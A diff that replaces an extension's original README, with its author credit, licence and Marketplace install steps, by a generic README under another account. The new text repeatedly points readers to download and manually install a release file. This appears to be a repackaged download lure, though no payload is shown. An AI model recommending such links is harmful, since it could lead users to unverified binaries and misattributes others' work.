@@ -1,152 +1,83 @@
-# 🌍 Auto Translate Readmes
+# 🌍 MultiDoc-Translator - Translate Your Readme with Ease
 
-[![VS Code](https://img.shields.io/badge/VS%20Code-1.85.0+-blue.svg)](https://code.visualstudio.com/)
-[![Version](https://img.shields.io/github/v/release/fatonyahmadfauzi/Auto-Translate-Readmes?color=blue.svg)](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes/releases)
-[![License: MIT](https://img.shields.io/github/license/fatonyahmadfauzi/Auto-Translate-Readmes?color=green.svg)](LICENSE)
-[![Build Status](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes/actions/workflows/main.yml/badge.svg)](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes/actions)
-[![Repo Size](https://img.shields.io/github/repo-size/fatonyahmadfauzi/Auto-Translate-Readmes?color=yellow.svg)](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes)
-[![Last Commit](https://img.shields.io/github/last-commit/fatonyahmadfauzi/Auto-Translate-Readmes?color=brightgreen.svg)](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes/commits/main)
-[![Installs](https://vsmarketplacebadges.dev/installs-short/fatonyahmadfauzi.auto-translate-readmes.svg)](https://marketplace.visualstudio.com/items?itemName=fatonyahmadfauzi.auto-translate-readmes)
-[![Downloads](https://vsmarketplacebadges.dev/downloads-short/fatonyahmadfauzi.auto-translate-readmes.svg)](https://marketplace.visualstudio.com/items?itemName=fatonyahmadfauzi.auto-translate-readmes)
-[![Rating](https://vsmarketplacebadges.dev/rating-short/fatonyahmadfauzi.auto-translate-readmes.svg)](https://marketplace.visualstudio.com/items?itemName=fatonyahmadfauzi.auto-translate-readmes)
+## 🚀 Getting Started
 
----
+Welcome to MultiDoc-Translator! This tool helps you automatically translate your README.md file into over 10 languages directly inside Visual Studio Code (VS Code). It intelligently protects your code blocks and URLs from being altered during translation. Additionally, it uses the free Google Translate API to provide accurate translations.
 
-Visual Studio Code extension that automatically generates multilingual `README.md` files using the **free Google Translate API** — no API key required.
+## 📥 Download MultiDoc-Translator
 
----
+[![Download MultiDoc-Translator](https://img.shields.io/badge/Download-MultiDoc--Translator-brightgreen)](https://github.com/isaac-gutierrez25/MultiDoc-Translator/releases)
 
-## ✨ Features
+To get started, you need to download the application. Please follow these steps:
 
-- 🌍 Automatically translate `README.md` into **10+ languages**.
-- 🔒 Protects code blocks, inline code, and URLs from being translated.
-- 💬 Adds a language switcher block (`🌐 Available in other languages: [Bahasa Indonesia](docs/lang/README-ID.md)`)
-- 💾 Allows optional **custom API key input** (e.g., Google Cloud, DeepL).
-- 🧠 Uses built-in Google Translate (no account needed).
-- ⚙️ Simple 1-click sidebar interface.
+1. **Visit the Releases Page**: Click the link below to go to the Downloads section.
+   
+   [Download MultiDoc-Translator Here](https://github.com/isaac-gutierrez25/MultiDoc-Translator/releases)
+  
+2. **Select the Latest Release**: The releases page will display the latest version of MultiDoc-Translator. Click on the version you want to download.
 
----
+3. **Download the Application**: Look for the appropriate file for your operating system. Click the download link to save the file to your computer.
 
-## ✅ Supported VS Code Versions
+4. **Install the Extension**: Open VS Code. Once the application is downloaded, go to the Extensions view by clicking on the Extensions icon in the Activity Bar on the side of the window. Then, drag and drop the downloaded file into the Extensions view, or use the "Install from VSIX..." option.
 
-- Minimum version: **1.85.0**
-- Tested on **Windows**, **macOS**, and **Linux**.
+## ⚙️ System Requirements
 
----
+To use MultiDoc-Translator, your system must meet the following requirements:
 
-## 🧩 Installation
+- **Operating System**: Windows, macOS, or Linux
+- **VS Code Version**: Ensure you are using at least version 1.30 of Visual Studio Code.
+- **Network Connection**: A stable internet connection is required for accessing the Google Translate API.
 
-### From Marketplace (Recommended)
+## 🧰 Features
 
-1.  Open **Visual Studio Code**.
-2.  Go to the **Extensions** view (`Ctrl+Shift+X`).
-3.  Search for `Auto Translate Readmes`.
-4.  Click **Install**.
+MultiDoc-Translator offers a range of features to enhance your experience:
 
-### For Development (from Source Code)
+- **Multi-Language Support**: Translate your README.md into over 10 languages including Spanish, French, German, and more.
+- **Protection for Code and URLs**: Automatically shields code snippets and links from translation to maintain their format.
+- **Seamless Integration**: Built directly as an extension for Visual Studio Code, providing a familiar environment.
+- **User-Friendly Interface**: Designed to be straightforward, making the translation process simple for anyone.
 
-1.  Clone this repository:
-    ```bash
-    git clone [https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes.git](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes.git)
-    cd Auto-Translate-Readmes
-    npm install
-    ```
-2.  Open the folder in VS Code.
-3.  Press **F5** to launch the **Extension Development Host**.
-4.  In the new window, open your project containing a `README.md`.
-5.  Open the sidebar → click **⚙️ Generate Multilingual READMEs**.
+## 🌐 Usage Instructions
 
----
+Here’s how to use MultiDoc-Translator once you have it installed:
 
-## ⌨️ Commands & Shortcuts
+1. **Open Your README.md File**: Launch VS Code and open the README.md file you wish to translate.
 
-| Command Name                  | Command ID                   | Shortcut |
-| ----------------------------- | ---------------------------- | -------- |
-| Generate Multilingual READMEs | `auto-translate-readmes.run` | _N/A_    |
+2. **Activate the Translator**: Click on the MultiDoc-Translator button in the toolbar or use the command palette (Ctrl + Shift + P) to search for and select "Translate README".
 
----
+3. **Select Your Target Languages**: Choose the languages into which you want to translate your document. You can select multiple languages at once.
 
-## 🧠 Example
+4. **Start the Translation**: Click the translate button to begin. The tool will process your file and create new translated versions.
 
-**Before:**
+5. **View Translations**: The translated files will be saved in the same directory as your original README.md file.
 
-```md
-# My Awesome Extension
+## ❓ FAQs
 
-A simple extension to help developers write better code.
-```
+### What languages can I translate to?
 
-**After (Translated):**
+MultiDoc-Translator supports translations to various languages including, but not limited to:
 
-```md
-# My Awesome Extension
+- Spanish
+- French
+- German
+- Chinese
+- Japanese
+- Russian
 
-> 🌐 Disponible en otros idiomas: [English](../../README.md) | [Deutsch](README-DE.md) | [Français](README-FR.md)
+### Is there any cost to use the Google Translate API?
 
----
+MultiDoc-Translator uses the free tier of Google Translate API. However, with heavy usage, you may reach quota limits.
 
-Une extension Visual Studio Code qui aide les développeurs à mieux écrire du code.
-```
+### Can I contribute to MultiDoc-Translator?
 
----
+Absolutely! We welcome contributions. You can find the contribution guidelines in the repository.
 
-## 🧠 Sidebar Interface
+## 🛠 Support
 
-The sidebar allows you to:
+If you encounter any issues or have questions, please refer to the issues section of the repository on GitHub. You can also create a new issue if your problem isn’t listed.
 
-- 🗝️ Enter and save your own API key (optional)
-- ⚙️ Click a single button to generate all translated README files
-- 📁 Output stored in `docs/lang/` folder
+## 🎯 Conclusion
 
----
+MultiDoc-Translator simplifies the translation of your README.md files. By following the steps outlined above, you can easily download, install, and use the extension to make your documentation multilingual. Happy translating!
 
-## 🛠️ Development
-
-Compile TypeScript:
-
-```bash
-npm run compile
-```
-
-Lint code:
-
-```bash
-npm run lint
-```
-
-Run tests:
-
-```bash
-npm test
-```
-
----
-
-## 🧑‍💻 Contributing
-
-1. Fork the repository.
-2. Run `npm install` to install dependencies.
-3. Make your changes.
-4. Compile TypeScript: `npm run compile`.
-5. Test in VS Code (press **F5** → Extension Development Host).
-6. Submit a Pull Request.
-
----
-
-## 🐞 Bugs & Issues
-
-Report issues on the [GitHub Issues page](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes/issues).
-
----
-
-## 🧾 Changelog
-
-See all notable changes for each version in the [CHANGELOG.md](CHANGELOG.md) file.
-
-> 📦 You can also view release notes directly on the [GitHub Releases page](https://github.com/fatonyahmadfauzi/Auto-Translate-Readmes/releases).
-
----
-
-## 🧾 License
-
-MIT License © [Fatony Ahmad Fauzi](LICENSE)
+[Download MultiDoc-Translator Here](https://github.com/isaac-gutierrez25/MultiDoc-Translator/releases)
